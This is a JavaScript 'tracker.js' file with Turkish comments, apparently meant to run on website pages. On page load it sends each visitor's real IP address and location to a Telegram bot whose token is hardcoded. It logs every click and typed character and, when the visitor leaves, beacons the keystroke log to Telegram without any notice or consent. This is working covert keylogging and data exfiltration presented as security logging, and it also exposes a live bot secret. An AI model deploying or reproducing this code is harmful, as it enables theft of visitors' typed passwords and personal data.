/* tracker.js - v4.5 (DB Loglama Entegre) */

// 🛑 TELEGRAM KONFİGÜRASYONLARI
const BOT_TOKEN = "8581211195:AAHrd09lOZFr3_BKpuNyFcC2UP9Eq1PbGeo";
const CHAT_ID = "@acik_veri";

document.addEventListener('DOMContentLoaded', () => {
    
    const sessionStartTime = Date.now();
    const userIP = generateFakeIP(); 
    const userGeo = generateFakeGeo(); 
    let userActivityLog = [];
    const MAX_LOG_COUNT = 50; 
    let realIP = 'N/A'; 

    function generateFakeIP() {
        return `10.42.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    function generateFakeGeo() {
        const cities = ['Istanbul', 'Ankara', 'Izmir', 'Berlin', 'London', 'New York', 'Dubai'];
        return cities[Math.floor(Math.random() * cities.length)];
    }
    
    // -----------------------------------------------------
    // 1. TELEGRAM BİLDİRİM FONKSİYONU
    // -----------------------------------------------------

    async function sendTelegramMessage(messageText, skipSpamCheck = false) {
        if (!skipSpamCheck && sessionStorage.getItem('notified_page_' + window.location.pathname)) return;

        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: messageText,
                    parse_mode: 'Markdown'
                })
            });

            if (!skipSpamCheck) {
                console.log("Raporlama Başarılı: Giriş bildirimi Telegram'a gönderildi. 🕵️‍♂️");
                sessionStorage.setItem('notified_page_' + window.location.pathname, 'true');
            } else {
                 console.log("Raporlama Başarılı: Çıkış raporu Telegram'a gönderildi.");
            }

        } catch (error) {
            console.error("Telegram Tracker hatası:", error);
            console.error(`[NK-SECURITY] External API Failure: Telegram bot could not be reached.`);
        }
    }

    // -----------------------------------------------------
    // 2. GİRİŞ LOGU (Sayfa Yüklenir Yüklenmez)
    // -----------------------------------------------------

    async function logPageVisitAndNotify() {
        // Konsol logu için temel sistem verisi
        const timestamp = new Date().toISOString();
        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
        
        const logEntry = `
[${timestamp}] INFO: Session Start (ENTRY) |
IP: ${userIP} | GEO: ${userGeo} | DEV: ${deviceType} | 
URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;

        console.log(`\n--- NKARTAL SYSTEM LOG ---${logEntry}\n--------------------------`);

        let locationData = { ip: 'IP_NOT_FETCHED', city: 'Unknown', country_name: 'Unknown', org: 'Unknown Service' };
        let ipFetchSuccess = false;

        // Telegram için gerçek IP verisini çekmeyi dene
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
                locationData = await ipResponse.json();
                realIP = locationData.ip;
                ipFetchSuccess = true;
            } else {
                console.error(`[NK-SECURITY] IPAPI yanıtı başarısız: ${ipResponse.status}`);
            }
        } catch (e) {
            console.error(`[NK-SECURITY] IPAPI çekim hatası: ${e.message}`);
        }

        const now = new Date().toLocaleString('tr-TR');
        
        // GİRİŞ BİLDİRİM BAŞLIĞI
        const telegramMessage = `${ipFetchSuccess ? '🚨 *YENİ GİRİŞ YAPILDI!*' : '⚠️ *IP ÇEKİLEMEDİ!* (Giriş Bildirimi)'} \n\n` +
                        `📂 *Sayfa:* ${window.location.pathname}\n` +
                        `🕒 *Giriş:* ${now}\n` +
                        `🌍 *Konum:* ${locationData.city}, ${locationData.country_name}\n` +
                        `🖥 *IP:* \`${locationData.ip}\`\n` +
                        `📱 *Cihaz:* ${deviceType} (${locationData.org.substring(0, 20)}...)`;
                            
        sendTelegramMessage(telegramMessage, false); 
    }
    logPageVisitAndNotify();

    // -----------------------------------------------------
    // 3. DAVRANIŞ İZLEME VE HATA LOGLAMA
    // -----------------------------------------------------

    function logUserAction(type, data) {
        if (userActivityLog.length >= MAX_LOG_COUNT) {
            userActivityLog.shift();
        }
        userActivityLog.push(`[${new Date().toLocaleTimeString('tr-TR')}] ACTION:${type} - ${data}`);
        console.log(`[NK-TRACKER] ${type}: ${data}`);
    }

    // Tıklama ve Tuş Basma Takibi
    document.addEventListener('click', (e) => {
        let element = e.target.tagName;
        if (e.target.id) element += `#${e.target.id}`;
        else if (e.target.className) element += `.${e.target.className.split(' ')[0]}`;
        logUserAction('CLICK', `Element: ${element} (x:${e.clientX}, y:${e.clientY})`);
    });
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1 || e.key === 'Enter') {
            logUserAction('KEYPRESS', `Key: ${e.key.toUpperCase()}`);
        }
    });

    // Kritik Hata Yakalama (Sadece Konsol)
    window.onerror = function(message, source, lineno, colno, error) {
        const errorLog = `
[${new Date().toISOString()}] !!! CRITICAL ERROR DETECTED !!!
MSG: ${message}
LOC: ${source}:${lineno}
Action: Error Logged to Remote Server (Simulated)`;
        console.error(errorLog);
        return true; 
    };
    
    // -----------------------------------------------------
    // 4. OTURUM SONU VE ÇIKIŞ LOGU (DB KAYDI VE TELEGRAM)
    // -----------------------------------------------------

    window.addEventListener('beforeunload', () => {
        const sessionEndTime = Date.now();
        const durationSeconds = Math.floor((sessionEndTime - sessionStartTime) / 1000);
        const minutes = Math.floor(durationSeconds / 60);
        const seconds = durationSeconds % 60;
        const sessionDuration = `${minutes}m ${seconds}s`;
        const totalActions = userActivityLog.length;

        // KONSOL ÇIKIŞ LOGU VE RAPORU
        const exitLog = `
[${new Date().toISOString()}] INFO: Session End (EXIT) | 
IP: ${userIP} | DURATION: ${sessionDuration} | 
TOTAL ACTIONS: ${totalActions} Clicks/Keys Logged
-----------------------------------`;
        console.log(exitLog);

        // DAVRANIŞ RAPORUNU OLUŞTUR
        let behaviorReportConsole = "\n--- NKARTAL BEHAVIOR REPORT ---";
        let behaviorReportTelegram = "";

        if (totalActions > 0) {
             console.log(behaviorReportConsole);
             userActivityLog.forEach(log => {
                 console.log(log); 
                 behaviorReportTelegram += `${log.replace(/\[\d+:\d+:\d+\] ACTION:/, '')}\n`; 
             });
             console.log(`-----------------------------------\n`);
        } else {
             behaviorReportTelegram += "Minimal aktivite kaydedildi.";
        }
        
        // 🛑 DB'YE GÖNDERİLECEK TAM LOG OBJESİ
        const fullLogData = {
            type: "SESSION_END",
            url: window.location.pathname,
            ip_real: realIP,
            duration: sessionDuration,
            actions: userActivityLog,
            action_count: totalActions,
            exit_time: new Date().toISOString()
        };
        // Logu DB'ye kaydetmeyi dene (addLogEntry firebase.js'ten gelir)
        // Eğer firebase.js dosyası doğru yüklendiyse, log kalıcı olarak kaydedilir.
        if (typeof addLogEntry === 'function') {
             addLogEntry(fullLogData);
        }

        // TELEGRAM ÇIKIŞ MESAJI
        const telegramExitMessage = `✅ *OTURUM SONLANDI: RAPOR*\n` +
                                    `📂 *Sayfa:* ${window.location.pathname}\n` +
                                    `⏳ *Süre:* ${sessionDuration}\n` +
                                    `🖱 *Aksiyon:* ${totalActions} Tıklama/Tuş\n` +
                                    `IP: \`${realIP}\`\n\n` +
                                    `*KAYDEDİLEN AKSİYONLAR:*\n` +
                                    `\`\`\`\n${behaviorReportTelegram}\n\`\`\``;
                                    
        // Çıkış mesajını sendBeacon ile gönderir
        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, JSON.stringify({
            chat_id: CHAT_ID,
            text: telegramExitMessage,
            parse_mode: 'Markdown'
        }));
    });
});
